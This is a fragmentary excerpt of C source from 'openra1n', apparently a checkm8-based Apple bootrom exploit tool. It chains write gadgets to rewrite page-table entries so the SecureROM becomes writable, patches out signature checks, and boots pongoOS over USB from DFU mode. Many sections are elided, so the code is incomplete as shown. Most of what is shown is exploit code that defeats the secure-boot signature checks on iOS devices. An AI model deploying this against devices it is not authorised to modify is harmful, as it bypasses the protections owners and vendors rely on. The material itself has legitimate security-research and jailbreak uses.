...
#define ARM_16K_TT_L2_SHIFT      25                    /* page descriptor shift */
    ...
    if(wnx) // only A9X-A11
    {
        ...
        new_bit_2 |= (cpid != 0x8001 ? (1uL << 2) : (2uL << 2));
        new_bit_2 |= (1uL << 53); // PXN
        new_bit_2 |= (1uL << 54); // XN
        uint32_t new_bit_lower_2  = (uint32_t)(new_bit_2 & 0xffffffff);
        uint32_t new_bit_upper_2  = (uint32_t)(new_bit_2 >> 32);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (vrom_rw_off + 0), new_bit_lower_2);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (vrom_rw_off + 4), new_bit_upper_2);
    ...
    if(wnx) // only A9X-A11
    {
        ...
        vrom_rw_bit |= (cpid != 0x8001 ? (1uL << 2) : (2uL << 2));
        ...
        PUSH(0, write_gadget, vrom_rw_va + TTBR0_BASE + (vrom_rw_off + 0), vrom_rw_bit_lower);
        PUSH(0, write_gadget, vrom_rw_va + TTBR0_BASE + (vrom_rw_off + 4), vrom_rw_bit_upper);
        ...
        PUSH(0, arm_clean_invalidate_dcache_line, vrom_rw_va + TTBR0_BASE + (vrom_rw_off & ~0xff), 0);
...
checkm8_stage_patch(const usb_handle_t *handle)
{
    ...
    switch (cpid)
    {
        ...
        case 0x8001: // A9x currently broken with sigcheck patch, works on signed bootchain
...
static int openFile(const char *filename, size_t *out_len, void **out_buf)
{
...
{
    LOG_RAINBOW("-=-=- openra1n: sigcheck patched edition -=-=-");
    if (argc < 2)
    {
        LOG_ERROR("Usage: %s <pongoOS> [boot]", argv[0]);
        return EXIT_FAILURE;
    }
    LOG_DEBUG("Reading pongoOS binary");
    if (openFile(argv[1], &payloads_Pongo_bin_len, (void **)&payloads_Pongo_bin) < 0)
    {
        return EXIT_FAILURE;
    }
    if (argc > 2)
    {
        ...
        {
            LOG_INFO("Booting pongoOS from yoloDFU mode");
            usb_handle_t handle;
            init_usb_handle(&handle, APPLE_VID, DFU_MODE_PID);
